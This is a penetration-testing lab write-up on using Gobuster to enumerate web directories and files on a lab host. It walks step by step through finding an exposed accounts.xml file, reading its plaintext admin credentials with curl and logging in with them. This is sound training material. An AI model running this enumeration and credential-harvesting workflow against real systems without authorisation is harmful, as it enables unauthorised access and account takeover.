## What is this lab about?
A hands-on lab demonstrating **Gobuster** for fast web directory and file enumeration. The lab compares Gobuster to DIRB, covers filtering output, discovering file extensions, following redirects, and subdirectory enumeration — ultimately leading to credential exposure via `accounts.xml`.

---

## Key Concepts Explained

**Gobuster vs DIRB**
- Both are directory brute-forcing tools, but **Gobuster is written in Go** and significantly faster.
- Gobuster uses **concurrent threads** for speed, while DIRB is single-threaded.
- Gobuster has cleaner output filtering and better redirect handling.

**HTTP Status Codes in Enumeration**
- **200 OK** — Resource exists and is accessible.
- **301/302** — Redirect (resource moved, often directories without trailing slash).
- **403 Forbidden** — Resource exists but access is denied.
- **404 Not Found** — Resource doesn't exist.
- **500 Internal Server Error** — Server error, may indicate interesting behavior.

**File Extension Enumeration (`-x`)**
- Searching for specific extensions (`.php`, `.xml`, `.txt`) helps find config files, backups, and exposed data.

## Commands & Workflow

### Step 1 — Basic Gobuster Directory Scan
```bash
# Check target IP
ip addr show
# Target: 192.36.17.3

# Basic directory enumeration
gobuster dir -u http://192.36.17.3 -w /usr/share/wordlists/dirb/common.txt

# Output shows:
# - /.git/          (301 redirect)
# - /css/           (301)
# - /data/          (301) ← Interesting
# - /passwords/     (301) ← Interesting
# - /uploads/       (301)
# - /phpinfo.php    (200)
# - /login.php      (200)
# - /server-status  (403)
```

### Step 2 — Filter Noise (Hide 403/404)
```bash
# Suppress 403 Forbidden and 404 Not Found for cleaner output
gobuster dir -u http://192.36.17.3 -w /usr/share/wordlists/dirb/common.txt -b 403,404

# Cleaner results showing only actionable findings
```

### Step 3 — File Extension Enumeration + Follow Redirects
```bash
# Search for specific file types and follow redirects
gobuster dir -u http://192.36.17.3 -w /usr/share/wordlists/dirb/common.txt -x php,xml,txt -r

# Key findings:
# - /phpinfo.php      (200) ← PHP configuration leak
# - /login.php        (200) ← Authentication endpoint
# - /index.php        (200) ← Main page
# - /accounts.xml     (200) ← CREDENTIAL EXPOSURE
# - Some 500 errors   ← Worth investigating
```

### Step 4 — Subdirectory Enumeration
```bash
# Enumerate deeper into discovered /data/ directory
gobuster dir -u http://192.36.17.3/data/ -w /usr/share/wordlists/dirb/common.txt

# Discovery:
# - /data/accounts.xml  (200) ← Contains usernames and passwords
```

### Step 5 — Exploit the Finding
```bash
# Retrieve exposed credentials
curl http://192.36.17.3/data/accounts.xml

# XML content reveals:
# <accounts>
#   <user>
#     <username>admin</username>
#     <password>adminpass</password>
#     <type>admin</type>
#   </user>
#   ...
# </accounts>

# Test credentials on login page
# Navigate to: http://192.36.17.3/login.php
# Username: admin
# Password: adminpass
# Result: Successful login as admin
```

## Gobuster Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `dir` | Directory enumeration mode | `gobuster dir ...` |
| `-u` | Target URL | `-u http://192.36.17.3` |
| `-w` | Wordlist path | `-w /usr/share/wordlists/dirb/common.txt` |
| `-x` | File extensions to search | `-x php,xml,txt` |
| `-r` | Follow redirects | `-r` |
| `-b` | Hide status codes (blacklist) | `-b 403,404` |
| `-t` | Threads (default 10) | `-t 50` for faster scanning |

## Key Takeaways

| Finding | Risk Level | Impact |
|---|---|---|
| `/data/accounts.xml` exposed | **CRITICAL** | Full credential compromise |
| `/phpinfo.php` accessible | **MEDIUM** | Server info leakage (versions, paths) |
| `/.git/` directory | **HIGH** | Source code disclosure potential |
| `/passwords/` directory | **HIGH** | Indicates sensitive data storage |
| Admin credentials in plaintext | **CRITICAL** | Complete authentication bypass |

- **Gobuster speed** comes from Go's concurrency — use `-t` to adjust threads based on target stability.
- **Always enumerate file extensions** — `.xml`, `.txt`, `.bak`, `.old` often contain sensitive data.
- **Follow redirects (`-r`)** to see the actual content behind 301/302 responses.
- **Subdirectory enumeration** is critical — initial scan reveals paths, but deeper scans find the actual files.
- **Exposed XML/JSON files** are goldmines — always check them for credentials, API keys, or configuration data.
- **Business impact**: Credential exposure = Authentication bypass = Unauthorized access to admin functions = Full compromise.
